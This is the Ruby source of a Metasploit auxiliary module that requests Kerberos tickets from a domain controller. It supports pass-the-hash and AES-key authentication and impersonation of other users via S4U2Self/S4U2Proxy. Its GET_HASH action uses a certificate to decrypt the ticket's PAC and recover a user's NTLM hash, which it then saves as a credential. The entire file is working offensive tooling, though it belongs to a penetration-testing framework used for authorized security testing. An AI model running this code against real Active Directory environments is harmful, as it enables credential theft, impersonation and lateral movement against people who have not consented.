##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::Kerberos
  include Msf::Exploit::Remote::Kerberos::Client
  include Msf::Exploit::Remote::Kerberos::Ticket::Storage

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Kerberos TGT/TGS Ticket Requester',
        'Description' => %q{
          This module requests TGT/TGS Kerberos tickets from the KDC
        },
        'Author' => [
          'Christophe De La Fuente', # Metasploit module
          'Spencer McIntyre', # Metasploit module
          # pkinit authors
          'Will Schroeder', # original idea/research
          'Lee Christensen', # original idea/research
          'Oliver Lyak', # certipy implementation
          'smashery' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'AKA' => ['getTGT', 'getST'],
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ ],
          'Reliability' => [ ]
        },
        'Actions' => [
          [ 'GET_TGT', { 'Description' => 'Request a Ticket-Granting-Ticket (TGT)' } ],
          [ 'GET_TGS', { 'Description' => 'Request a Ticket-Granting-Service (TGS)' } ],
          [ 'GET_HASH', { 'Description' => 'Request a TGS to recover the NTLM hash' } ]
        ],
        'DefaultAction' => 'GET_TGT'
      )
    )

    register_options(
      [
        OptString.new('DOMAIN', [ false, 'The Fully Qualified Domain Name (FQDN). Ex: mydomain.local' ]),
        OptString.new('USERNAME', [ false, 'The domain user' ]),
        OptString.new('PASSWORD', [ false, 'The domain user\'s password' ]),
        OptPath.new('CERT_FILE', [ false, 'The PKCS12 (.pfx) certificate file to authenticate with' ]),
        OptString.new('CERT_PASSWORD', [ false, 'The certificate file\'s password' ]),
        OptString.new(
          'NTHASH', [
            false,
            'The NT hash in hex string. Server must support RC4'
          ]
        ),
        OptString.new(
          'AES_KEY', [
            false,
            'The AES key to use for Kerberos authentication in hex string. Supported keys: 128 or 256 bits'
          ]
        ),
        OptString.new(
          'SPN', [
            false,
            'The Service Principal Name, format is service_name/FQDN. Ex: cifs/dc01.mydomain.local'
          ],
          conditions: %w[ACTION == GET_TGS]
        ),
        OptString.new(
          'IMPERSONATE', [
            false,
            'The user on whose behalf a TGS is requested (it will use S4U2Self/S4U2Proxy to request the ticket)',
          ],
          conditions: %w[ACTION == GET_TGS]
        ),
        OptPath.new(
          'Krb5Ccname', [
            false,
            'The Kerberos TGT to use when requesting the service ticket. If unset, the database will be checked'
          ],
          conditions: %w[ACTION == GET_TGS]
        ),
      ]
    )

    deregister_options('KrbCacheMode')
  end

  def validate_options
    if datastore['CERT_FILE'].present?
      certificate = File.read(datastore['CERT_FILE'])
      begin
        @pfx = OpenSSL::PKCS12.new(certificate, datastore['CERT_PASSWORD'] || '')
      rescue OpenSSL::PKCS12::PKCS12Error => e
        fail_with(Failure::BadConfig, "Unable to parse certificate file (#{e})")
      end

      if datastore['USERNAME'].blank? && datastore['DOMAIN'].present?
        fail_with(Failure::BadConfig, 'Domain override provided but no username override provided (must provide both or neither)')
      elsif datastore['DOMAIN'].blank? && datastore['USERNAME'].present?
        fail_with(Failure::BadConfig, 'Username override provided but no domain override provided (must provide both or neither)')
      end

      begin
        @username, @realm = extract_user_and_realm(@pfx.certificate, datastore['USERNAME'], datastore['DOMAIN'])
      rescue ArgumentError => e
        fail_with(Failure::BadConfig, e.message)
      end
    else # USERNAME and DOMAIN are required when they can't be extracted from the certificate
      @username = datastore['USERNAME']
      fail_with(Failure::BadConfig, 'USERNAME must be specified when used without a certificate') if @username.blank?

      @realm = datastore['DOMAIN']
      fail_with(Failure::BadConfig, 'DOMAIN must be specified when used without a certificate') if @realm.blank?
    end

    if datastore['NTHASH'].present? && !datastore['NTHASH'].match(/^\h{32}$/)
      fail_with(Failure::BadConfig, 'NTHASH must be a hex string of 32 characters (128 bits)')
    end

    if datastore['AES_KEY'].present? && !datastore['AES_KEY'].match(/^(\h{32}|\h{64})$/)
      fail_with(Failure::BadConfig,
                'AES_KEY must be a hex string of 32 characters for 128-bits AES keys or 64 characters for 256-bits AES keys')
    end

    if action.name == 'GET_TGS' && datastore['SPN'].blank?
      fail_with(Failure::BadConfig, "SPN must be provided when action is #{action.name}")
    end

    if action.name == 'GET_HASH' && datastore['CERT_FILE'].blank?
      fail_with(Failure::BadConfig, "CERT_FILE must be provided when action is #{action.name}")
    end

    if datastore['SPN'].present? && !datastore['SPN'].match(%r{.+/.+})
      fail_with(Failure::BadConfig, 'SPN format must be service_name/FQDN (ex: cifs/dc01.mydomain.local)')
    end
  end

  def run
    validate_options

    send("action_#{action.name.downcase}")

    report_service(
      host: rhost,
      port: rport,
      proto: 'tcp',
      name: 'kerberos',
      info: "Module: #{fullname}, KDC for domain #{@realm}"
    )
  rescue ::Rex::ConnectionError => e
    elog('Connection error', error: e)
    fail_with(Failure::Unreachable, e.message)
  rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError,
         ::EOFError => e
    msg = e.to_s
    if e.respond_to?(:error_code) &&
       e.error_code == ::Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_PREAUTH_REQUIRED
      msg << ' - Check the authentication-related options (Krb5Ccname, PASSWORD, NTHASH or AES_KEY)'
    end
    fail_with(Failure::Unknown, msg)
  end

  def init_authenticator(options = {})
    options.merge!({
      host: rhost,
      realm: @realm,
      username: @username,
      pfx: @pfx,
      framework: framework,
      framework_module: self
    })
    options[:password] = datastore['PASSWORD'] if datastore['PASSWORD'].present?
    if datastore['NTHASH'].present?
      options[:key] = [datastore['NTHASH']].pack('H*')
      options[:offered_etypes] = [ Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC ]
    end
    if datastore['AES_KEY'].present?
      options[:key] = [ datastore['AES_KEY'] ].pack('H*')
      options[:offered_etypes] = if options[:key].size == 32
                                   [ Rex::Proto::Kerberos::Crypto::Encryption::AES256 ]
                                 else
                                   [ Rex::Proto::Kerberos::Crypto::Encryption::AES128 ]
                                 end
    end

    Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::Base.new(**options)
  end

  def action_get_tgt
    print_status("#{peer} - Getting TGT for #{@username}@#{@realm}")

    # Never attempt to use the kerberos cache when requesting a kerberos TGT, to ensure a request is made
    authenticator = init_authenticator({ ticket_storage: kerberos_ticket_storage(read: false, write: true) })
    authenticator.request_tgt_only
  end

  def action_get_tgs
    authenticator = init_authenticator({ ticket_storage: kerberos_ticket_storage(read: true, write: true) })
    tgt_request_options = {}
    if datastore['Krb5Ccname'].present?
      tgt_request_options[:cache_file] = datastore['Krb5Ccname']
    end
    credential = authenticator.request_tgt_only(tgt_request_options)

    if datastore['IMPERSONATE'].present?
      print_status("#{peer} - Getting TGS impersonating #{datastore['IMPERSONATE']}@#{@realm} (SPN: #{datastore['SPN']})")

      sname = Rex::Proto::Kerberos::Model::PrincipalName.new(
        name_type: Rex::Proto::Kerberos::Model::NameType::NT_UNKNOWN,
        name_string: [@username]
      )
      auth_options = {
        sname: sname,
        impersonate: datastore['IMPERSONATE']
      }
      tgs_ticket, _tgs_auth = authenticator.s4u2self(
        credential,
        auth_options.merge(ticket_storage: kerberos_ticket_storage(read: false, write: true))
      )

      auth_options[:sname] = Rex::Proto::Kerberos::Model::PrincipalName.new(
        name_type: Rex::Proto::Kerberos::Model::NameType::NT_SRV_INST,
        name_string: datastore['SPN'].split('/')
      )
      auth_options[:tgs_ticket] = tgs_ticket
      authenticator.s4u2proxy(credential, auth_options)
    else
      print_status("#{peer} - Getting TGS for #{@username}@#{@realm} (SPN: #{datastore['SPN']})")

      sname = Rex::Proto::Kerberos::Model::PrincipalName.new(
        name_type: Rex::Proto::Kerberos::Model::NameType::NT_SRV_INST,
        name_string: datastore['SPN'].split('/')
      )
      tgs_options = {
        sname: sname,
        ticket_storage: kerberos_ticket_storage(read: false)
      }

      authenticator.request_tgs_only(credential, tgs_options)
    end
  end

  def action_get_hash
    authenticator = init_authenticator({ ticket_storage: kerberos_ticket_storage(read: false, write: true) })
    auth_context = authenticator.authenticate_via_kdc(options)
    credential = auth_context[:credential]

    print_status("#{peer} - Getting NTLM hash for #{@username}@#{@realm}")

    session_key = Rex::Proto::Kerberos::Model::EncryptionKey.new(
      type: credential.keyblock.enctype.value,
      value: credential.keyblock.data.value
    )

    tgs_ticket, _tgs_auth = authenticator.u2uself(credential)

    ticket_enc_part = Rex::Proto::Kerberos::Model::TicketEncPart.decode(
      tgs_ticket.enc_part.decrypt_asn1(session_key.value, Rex::Proto::Kerberos::Crypto::KeyUsage::KDC_REP_TICKET)
    )
    value = OpenSSL::ASN1.decode(ticket_enc_part.authorization_data.elements[0][:data]).value[0].value[1].value[0].value
    pac = Rex::Proto::Kerberos::Pac::Krb5Pac.read(value)
    pac_info_buffer = pac.pac_info_buffers.find do |buffer|
      buffer.ul_type == Rex::Proto::Kerberos::Pac::Krb5PacElementType::CREDENTIAL_INFORMATION
    end
    unless pac_info_buffer
      print_error('NTLM hash not found in PAC')
      return
    end

    serialized_pac_credential_data = pac_info_buffer.buffer.pac_element.decrypt_serialized_data(auth_context[:krb_enc_key][:key])
    ntlm_hash = serialized_pac_credential_data.data.extract_ntlm_hash
    print_good("Found NTLM hash for #{@username}: #{ntlm_hash}")

    report_ntlm(ntlm_hash)
  end

  def report_ntlm(hash)
    jtr_format = Metasploit::Framework::Hashes.identify_hash(hash)
    service_data = {
      address: rhost,
      port: rport,
      service_name: 'kerberos',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }
    credential_data = {
      module_fullname: fullname,
      origin_type: :service,
      private_data: hash,
      private_type: :ntlm_hash,
      jtr_format: jtr_format,
      username: @username,
      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
      realm_value: @realm
    }.merge(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end
end
